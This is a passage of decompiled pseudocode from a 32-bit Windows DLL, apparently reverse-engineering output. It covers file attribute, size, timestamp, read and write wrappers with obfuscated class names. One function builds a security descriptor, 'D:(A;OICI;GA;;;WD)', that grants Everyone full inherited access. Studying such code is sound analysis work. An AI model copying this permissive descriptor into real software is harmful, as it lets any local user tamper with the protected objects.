  FILETIME CreationTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1001847C(&v8, &CreationTime, this, &LastWriteTime);
  LastAccessTime = sub_1001856E(a2, a3, 1);
  return sub_1001807D(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (10018298) --------------------------------------------------------
DWORD __thiscall sub_10018298(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  DWORD dwFileAttributes; // esi
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-29Ch] BYREF
  struct _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+14h] [ebp-28Ch] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+48h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    if ( !GetFileInformationByHandle(this[1], &FileInformation) )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
    dwFileAttributes = FileInformation.dwFileAttributes;
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    dwFileAttributes = FindFileData.dwFileAttributes;
    if ( !FindClose(FirstFileW) )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  if ( dwFileAttributes == 128 )
    return 0;
  return dwFileAttributes;
}
// 10018298: using guessed type _DWORD pExceptionObject[4];

//----- (10018367) --------------------------------------------------------
BOOL __thiscall sub_10018367(void *this, DWORD dwFileAttributes)
{
  int v2; // eax
  BOOL result; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  result = SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), dwFileAttributes);
  if ( !result )
  {
    if ( GetLastError() == 2 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return result;
}
// 10018367: using guessed type _DWORD pExceptionObject[4];

//----- (100183BB) --------------------------------------------------------
DWORD __thiscall sub_100183BB(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  DWORD FileSize; // esi
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-268h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    FileSize = GetFileSize(this[1], 0);
    if ( FileSize == -1 )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    FileSize = FindFileData.nFileSizeLow;
    if ( !FindClose(FirstFileW) )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return FileSize;
}
// 100183BB: using guessed type _DWORD pExceptionObject[4];

//----- (1001847C) --------------------------------------------------------
BOOL __userpurge sub_1001847C@<eax>(
        struct _FILETIME *a1@<ebx>,
        struct _FILETIME *a2@<edi>,
        HANDLE *a3@<esi>,
        struct _FILETIME *a4)
{
  int v4; // eax
  HANDLE FirstFileW; // eax
  DWORD dwLowDateTime; // edx
  BOOL result; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-268h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*a3 + 3))(a3) )
  {
    result = GetFileTime(a3[1], a2, a1, a4);
    if ( !result )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  else
  {
    v4 = (*((int (__thiscall **)(HANDLE *))*a3 + 5))(a3);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v4 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    dwLowDateTime = FindFileData.ftLastWriteTime.dwLowDateTime;
    *a2 = FindFileData.ftCreationTime;
    *a1 = FindFileData.ftLastAccessTime;
    a4->dwLowDateTime = dwLowDateTime;
    a4->dwHighDateTime = FindFileData.ftLastWriteTime.dwHighDateTime;
    result = FindClose(FirstFileW);
    if ( !result )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 1001847C: using guessed type _DWORD pExceptionObject[4];

//----- (1001856E) --------------------------------------------------------
struct _FILETIME __usercall sub_1001856E@<edx:eax>(const FILETIME *a1@<eax>, int a2, int a3)
{
  BOOL v3; // eax
  bool v4; // cl
  DWORD dwLowDateTime; // edx
  DWORD dwHighDateTime; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-18h] BYREF
  struct _FILETIME LocalFileTime; // [esp+10h] [ebp-8h] BYREF

  if ( a2 == 1 )
  {
    if ( !a3 )
    {
      v3 = FileTimeToLocalFileTime(a1, &LocalFileTime);
LABEL_7:
      v4 = v3;
      goto LABEL_9;
    }
  }
  else if ( !a2 && a3 == 1 )
  {
    v3 = LocalFileTimeToFileTime(a1, &LocalFileTime);
    goto LABEL_7;
  }
  dwLowDateTime = a1->dwLowDateTime;
  dwHighDateTime = a1->dwHighDateTime;
  v4 = 1;
  LocalFileTime.dwLowDateTime = dwLowDateTime;
  LocalFileTime.dwHighDateTime = dwHighDateTime;
LABEL_9:
  if ( !v4 )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return LocalFileTime;
}
// 1001856E: using guessed type _DWORD pExceptionObject[4];

//----- (100185DD) --------------------------------------------------------
__int16 __thiscall sub_100185DD(void *this)
{
  __int16 v2; // si
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_1000C28D((void *)1, (int)v4, 0);
  v5 = 0;
  if ( (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 48))(this, v4) == 1 )
    v2 = *(unsigned __int8 *)sub_1000C55B((int)v4, 0);
  else
    v2 = -1;
  v5 = -1;
  sub_1000C45D(v4);
  return v2;
}
// 100185DD: using guessed type int var_20[7];

//----- (1001863B) --------------------------------------------------------
int __thiscall sub_1001863B(HANDLE *this, _DWORD *NumberOfBytesRead)
{
  _DWORD *v2; // esi
  DWORD v3; // ebx
  unsigned __int8 (__thiscall **v5)(HANDLE *); // eax
  int result; // eax
  int v7; // eax
  char v8; // bl
  void *v9; // eax
  BOOL File; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-14h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+1Ch] [ebp-4h]

  v2 = NumberOfBytesRead;
  v3 = NumberOfBytesRead[3];
  v5 = (unsigned __int8 (__thiscall **)(HANDLE *))*this;
  nNumberOfBytesToRead = v3;
  if ( !v5[3](this) )
  {
    sub_1002D4D1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__);
  }
  if ( !v3 )
    return 0;
  v7 = v2[1];
  NumberOfBytesRead = 0;
  v8 = *(_BYTE *)(v7 + 8);
  v9 = (void *)sub_1000C50A(v2);
  File = ReadFile(this[1], v9, nNumberOfBytesToRead, (LPDWORD)&NumberOfBytesRead, 0);
  if ( v8 )
    *(_BYTE *)(v2[1] + 8) = 1;
  if ( !File )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  result = (int)NumberOfBytesRead;
  if ( !NumberOfBytesRead )
    return -1;
  return result;
}
// 1001863B: using guessed type _DWORD pExceptionObject[4];

//----- (100186CD) --------------------------------------------------------
void __thiscall sub_100186CD(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D528(this + 3);
  sub_1000DF1A(v1);
}

//----- (100186E0) --------------------------------------------------------
_DWORD *__thiscall sub_100186E0(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073D14;
    this[2] = &unk_10073D1C;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001748D(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073D0C;
  return this;
}
// 10073D0C: using guessed type int (__stdcall *off_10073D0C)(char);

//----- (10018756) --------------------------------------------------------
char *__thiscall sub_10018756(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_100186CD(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10018778) --------------------------------------------------------
LONG __thiscall sub_10018778(void *this, char a2)
{
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_1000C28D((void *)1, (int)v4, &a2);
  v5 = 0;
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 56))(this, v4);
  v5 = -1;
  return sub_1000C45D(v4);
}
// 10018778: using guessed type int var_20[7];

//----- (100187B9) --------------------------------------------------------
int __thiscall sub_100187B9(HANDLE *this, _DWORD *NumberOfBytesWritten)
{
  _DWORD *v2; // ebx
  DWORD v4; // edi
  int result; // eax
  const void *v6; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-10h] BYREF

  v2 = NumberOfBytesWritten;
  v4 = NumberOfBytesWritten[3];
  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( !(_BYTE)result )
  {
    sub_1002D4D1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__);
  }
  if ( v4 )
  {
    NumberOfBytesWritten = 0;
    v6 = (const void *)sub_1000C52E(v2);
    result = WriteFile(this[1], v6, v4, (LPDWORD)&NumberOfBytesWritten, 0);
    if ( !result || NumberOfBytesWritten != (_DWORD *)v4 )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 100187B9: using guessed type _DWORD pExceptionObject[4];

//----- (1001882C) --------------------------------------------------------
DWORD __thiscall sub_1001882C(HANDLE *this, LONG lDistanceToMove, DWORD dwMoveMethod)
{
  DWORD result; // eax
  _ThrowInfo *v5; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1002D4D1(pExceptionObject);
    v5 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetFilePointer(this[1], lDistanceToMove, 0, dwMoveMethod);
  if ( result == -1 )
  {
    if ( GetLastError() == 131 )
      sub_1002D614(pExceptionObject);
    else
      sub_1002D306(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v5);
  }
  return result;
}
// 10018850: variable 'v5' is possibly undefined
// 1001882C: using guessed type _DWORD pExceptionObject[4];

//----- (1001889C) --------------------------------------------------------
void __thiscall sub_1001889C(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D66B(this + 3);
  sub_1000DF1A(v1);
}

//----- (100188AF) --------------------------------------------------------
_DWORD *__thiscall sub_100188AF(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073D2C;
    this[2] = &unk_10073D34;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001748D(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073D24;
  return this;
}
// 10073D24: using guessed type int (__stdcall *off_10073D24)(char);

//----- (10018925) --------------------------------------------------------
char *__thiscall sub_10018925(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_1001889C(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10018947) --------------------------------------------------------
DWORD __thiscall sub_10018947(HANDLE *this)
{
  DWORD result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1002D4D1(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetFilePointer(this[1], 0, 0, 1u);
  if ( result == -1 )
  {
    sub_1002D306(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 1001896B: variable 'v3' is possibly undefined
// 10018947: using guessed type _DWORD pExceptionObject[4];

//----- (10018999) --------------------------------------------------------
BOOL __thiscall sub_10018999(HANDLE *this)
{
  BOOL result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1002D4D1(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = FlushFileBuffers(this[1]);
  if ( !result )
  {
    sub_1002D306(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 100189BD: variable 'v3' is possibly undefined
// 10018999: using guessed type _DWORD pExceptionObject[4];

//----- (100189E4) --------------------------------------------------------
BOOL __thiscall sub_100189E4(HANDLE *this)
{
  BOOL result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1002D4D1(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetEndOfFile(this[1]);
  if ( !result )
  {
    sub_1002D306(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 10018A08: variable 'v3' is possibly undefined
// 100189E4: using guessed type _DWORD pExceptionObject[4];

//----- (10018A2F) --------------------------------------------------------
int __usercall sub_10018A2F@<eax>(int a1@<esi>)
{
  _DWORD *v1; // eax

  *(_DWORD *)a1 = off_10073DB4;
  v1 = operator new(0xCu);
  *(_DWORD *)(a1 + 4) = v1;
  *(_BYTE *)(a1 + 8) = 0;
  *v1 = 12;
  *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) = 0;
  *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) = 0;
  return a1;
}
// 10073DB4: using guessed type int (__thiscall *off_10073DB4[2])(void *Block, char);

//----- (10018A5A) --------------------------------------------------------
_DWORD *__thiscall sub_10018A5A(_DWORD *Block, char a2)
{
  sub_10018BEB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10018A88) --------------------------------------------------------
_DWORD *__cdecl sub_10018A88(_DWORD *a1)
{
  void *v1; // eax
  int v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  _DWORD *result; // eax
  int pExceptionObject; // [esp+10h] [ebp-20h] BYREF
  int v7[2]; // [esp+14h] [ebp-1Ch] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+1Ch] [ebp-14h] BYREF
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v9 = 0;
  v1 = operator new(0xCu);
  v7[1] = (int)v1;
  v10 = 1;
  if ( v1 )
    v2 = sub_10018A2F((int)v1);
  else
    v2 = 0;
  sub_10018C5B(a1, v2);
  v10 = 0;
  v9 = 1;
  v3 = sub_10018C2A(v7);
  v10 = 2;
  v4 = !ConvertStringSecurityDescriptorToSecurityDescriptorW(*(LPCWSTR *)(v3[1] + 12), 1u, &SecurityDescriptor, 0);
  LOBYTE(v10) = 0;
  sub_10009F65(v7);
  if ( v4 )
  {
    sub_1000E2E3(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  result = a1;
  *(_DWORD *)(*(_DWORD *)(*a1 + 4) + 4) = SecurityDescriptor;
  *(_BYTE *)(*a1 + 8) = 1;
  return result;
}

//----- (10018B3B) --------------------------------------------------------
_DWORD *__cdecl sub_10018B3B(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = operator new(0xCu);
  if ( v1 )
  {
    *v1 = off_10073DB4;
    v1[1] = 0;
    *((_BYTE *)v1 + 8) = 0;
  }
  else
  {
    v1 = 0;
  }
  sub_10018C5B(a1, (int)v1);
  return a1;
}
// 10073DB4: using guessed type int (__thiscall *off_10073DB4[2])(void *Block, char);

//----- (10018BA1) --------------------------------------------------------
_DWORD *__usercall sub_10018BA1@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(a1 + 4);
  if ( result )
  {
    result = (_DWORD *)result[1];
    if ( result )
    {
      if ( *(_BYTE *)(a1 + 8) )
        LocalFree(result);
      else
        j__free(result);
      result = *(_DWORD **)(a1 + 4);
      result[1] = 0;
    }
  }
  return result;
}

//----- (10018BEB) --------------------------------------------------------
void __thiscall sub_10018BEB(_DWORD *this)
{
  void *v2; // esi

  *this = off_10073DB4;
  sub_10018BA1((int)this);
  v2 = (void *)this[1];
  if ( v2 )
    j__free(v2);
}
// 10073DB4: using guessed type int (__thiscall *off_10073DB4[2])(void *Block, char);

//----- (10018C2A) --------------------------------------------------------
_DWORD *__cdecl sub_10018C2A(_DWORD *a1)
{
  sub_10009D2C(a1, (wchar_t *)L"D:(A;OICI;GA;;;WD)");
  return a1;
}

//----- (10018C5B) --------------------------------------------------------
_DWORD *__userpurge sub_10018C5B@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10018C9A) --------------------------------------------------------
_DWORD *__stdcall sub_10018C9A(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10073DB8;
  *a1 = &off_10073DC0;
  return result;
}
// 10073DB8: using guessed type int (__thiscall *off_10073DB8)(void *Block, char);
// 10073DC0: using guessed type int (__thiscall *off_10073DC0)(void *Block, char);

//----- (10018CC5) --------------------------------------------------------
_DWORD *__thiscall sub_10018CC5(_DWORD *Block, char a2)
{
  sub_10018D0B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10018CEB) --------------------------------------------------------
_DWORD *__thiscall sub_10018CEB(_DWORD *Block, char a2)
{
  *Block = &off_10073DB8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073DB8: using guessed type int (__thiscall *off_10073DB8)(void *Block, char);

//----- (10018D0B) --------------------------------------------------------
void __thiscall sub_10018D0B(_DWORD *this)
{
  *this = &off_10073DC0;
  *this = &off_10073DB8;
}
// 10073DB8: using guessed type int (__thiscall *off_10073DB8)(void *Block, char);
// 10073DC0: using guessed type int (__thiscall *off_10073DC0)(void *Block, char);

//----- (10018D30) --------------------------------------------------------
int __thiscall sub_10018D30(void *this, int a2)
{
  char v3; // al
  int v5; // [esp-14h] [ebp-DCh] BYREF
  int v6; // [esp-10h] [ebp-D8h]
  int v7; // [esp-Ch] [ebp-D4h]
  int v8; // [esp-8h] [ebp-D0h]
  int v9; // [esp-4h] [ebp-CCh]
  int v10[9]; // [esp+24h] [ebp-A4h] BYREF
  int v11[9]; // [esp+48h] [ebp-80h] BYREF
  _DWORD v12[4]; // [esp+6Ch] [ebp-5Ch] BYREF
  int v13[5]; // [esp+7Ch] [ebp-4Ch] BYREF
  _DWORD v14[4]; // [esp+94h] [ebp-34h] BYREF
  _DWORD v15[4]; // [esp+A4h] [ebp-24h] BYREF
  void *v16; // [esp+B4h] [ebp-14h]
  int v17; // [esp+C4h] [ebp-4h]

  v16 = this;
  sub_10019D5C(v10);
  v17 = 0;
  sub_1001B3FC(v12, (int)v10, 1);
  LOBYTE(v17) = 1;
  sub_1000C28D(0, (int)v13, 0);
  LOBYTE(v17) = 3;
  (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 12))(this, v12);
  v17 = 2;
  sub_1001B3FC(v15, a2, 0);
  LOBYTE(v17) = 6;
  sub_1001B4DB(v15, 15);
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v16 + 8))(v16);
  sub_1001B4DB(v15, v3);
  sub_10019D5C(v11);
  LOBYTE(v17) = 7;
  sub_1001B3FC(v14, (int)v11, 1);
  LOBYTE(v17) = 8;
  sub_10019EAB(v10, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001B581(v14, v5, v6, v7, v8, v9);
  sub_1000C3F3(v13, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001B581(v14, v5, v6, v7, v8, v9);
  sub_10019EAB(v11, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001B581(v15, v5, v6, v7, v8, v9);
  LOBYTE(v17) = 7;
  sub_1001B44E(v14);
  LOBYTE(v17) = 6;
  sub_10019DBF((int)v11);
  LOBYTE(v17) = 2;
  sub_1001B44E(v15);
  LOBYTE(v17) = 1;
  sub_1000C45D(v13);
  LOBYTE(v17) = 0;
  sub_1001B44E(v12);
  v17 = -1;
  return sub_10019DBF((int)v10);
}
// 10018D30: using guessed type int var_A4[9];
// 10018D30: using guessed type _DWORD var_5C[4];
// 10018D30: using guessed type int var_4C[5];
// 10018D30: using guessed type _DWORD var_24[4];
// 10018D30: using guessed type int var_80[9];
// 10018D30: using guessed type _DWORD var_34[4];

//----- (10018EE4) --------------------------------------------------------
_DWORD *__stdcall sub_10018EE4(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  sub_1000DEEF(a1);
  *a1 = &off_10072D24;
  v1 = operator new(0x24u);
  if ( v1 )
    v2 = sub_10019D5C(v1);
  else
    v2 = 0;
  sub_10018FEF(a1 + 1, (int)v2);
  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1001B3FC(v3, a1[1], 1);
  else
    v4 = 0;
  sub_10019034(a1 + 3, (int)v4);
  return a1;
}
// 10072D24: using guessed type int (__thiscall *off_10072D24)(void *Block, char);

//----- (10018F6F) --------------------------------------------------------
void __thiscall sub_10018F6F(_DWORD *this)
{
  *this = &off_10072D24;
  sub_10004235(this + 3);
  sub_100041E8(this + 1);
  sub_1000DF1A(this);
}
// 10072D24: using guessed type int (__thiscall *off_10072D24)(void *Block, char);

//----- (10018FB6) --------------------------------------------------------
int __userpurge sub_10018FB6@<eax>(int a1@<esi>, int a2)
{
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 20))(*(_DWORD *)(a1 + 12));
  (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 4) + 36))(*(_DWORD *)(a1 + 4), a2);
  return a2;
}

//----- (10018FEF) --------------------------------------------------------
_DWORD *__userpurge sub_10018FEF@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10019034) --------------------------------------------------------
_DWORD *__userpurge sub_10019034@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10019079) --------------------------------------------------------
_DWORD *__stdcall sub_10019079(_DWORD *a1)
{
  _DWORD *v1; // edx

  sub_10018C9A(a1);
  *v1 = &off_10073DD0;
  return v1;
}
// 10019092: variable 'v1' is possibly undefined
// 10073DD0: using guessed type int (__thiscall *off_10073DD0)(void *Block, char);

//----- (100190A6) --------------------------------------------------------
_DWORD *__thiscall sub_100190A6(_DWORD *Block, char a2)
{
  sub_100190C5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100190C5) --------------------------------------------------------
void __thiscall sub_100190C5(_DWORD *this)
{
  *this = &off_10073DD0;
  sub_10018D0B(this);
}
// 10073DD0: using guessed type int (__thiscall *off_10073DD0)(void *Block, char);

//----- (100190E9) --------------------------------------------------------
int sub_100190E9()
{
  return 44;
}

//----- (100190ED) --------------------------------------------------------
int __stdcall sub_100190ED(int *a1)
{
  int v1; // eax
  _DWORD v3[9]; // [esp-14h] [ebp-58h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+10h] [ebp-34h] BYREF
  _DWORD pExceptionObject[3]; // [esp+20h] [ebp-24h] BYREF
  struct _FILETIME FileTime; // [esp+2Ch] [ebp-18h] BYREF
  _DWORD *v7; // [esp+34h] [ebp-10h]
  int v8; // [esp+40h] [ebp-4h]

  memset(&SystemTime, 0, sizeof(SystemTime));
  memset(&FileTime, 0, sizeof(FileTime));
  GetSystemTime(&SystemTime);
  if ( !SystemTimeToFileTime(&SystemTime, &FileTime) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v7 = v3;
  sub_1000C28D((void *)8, (int)v3, &FileTime);
  v8 = 0;
  v1 = *a1;
  v8 = -1;
  return (*(int (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v1 + 76))(
           a1,
           v3[0],
           v3[1],
           v3[2],
           v3[3],
           v3[4]);
}
// 100190ED: using guessed type _DWORD pExceptionObject[3];

//----- (10019177) --------------------------------------------------------
_DWORD *__stdcall sub_10019177(_DWORD *a1, int a2)
{
  *a1 = off_10073DEC;
  a1[1] = a2;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10025ED0(a1 + 2);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10025F20(a1 + 4);
  sub_10019D5C(a1 + 6);
  a1[15] = 0;
  a1[16] = 1;
  return a1;
}
// 10073DEC: using guessed type int (__thiscall *off_10073DEC[2])(void *Block, char);

//----- (100191DE) --------------------------------------------------------
_DWORD *__thiscall sub_100191DE(_DWORD *Block, char a2)
{
  sub_100191FD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100191FD) --------------------------------------------------------
char __thiscall sub_100191FD(_DWORD *this)
{
  *this = off_10073DEC;
  sub_10019DBF((int)(this + 6));
  sub_100197B0(this + 4);
  return sub_1001974A(this + 2);
}
// 10073DEC: using guessed type int (__thiscall *off_10073DEC[2])(void *Block, char);

//----- (10019241) --------------------------------------------------------
LONG __thiscall sub_10019241(int this, int a2)
{
  int *v3; // eax
  int v5[5]; // [esp+10h] [ebp-54h] BYREF
  struct tagRECT Rect; // [esp+24h] [ebp-40h] BYREF
  _DWORD v7[3]; // [esp+34h] [ebp-30h] BYREF
  _DWORD v8[3]; // [esp+40h] [ebp-24h] BYREF
  _DWORD pExceptionObject[4]; // [esp+50h] [ebp-14h] BYREF
  int v10; // [esp+60h] [ebp-4h]

  *(_DWORD *)(this + 60) = 4;
  memset(&Rect, 0, sizeof(Rect));
  v10 = 0;
  if ( *(_DWORD *)(this + 64) == 1 )
  {
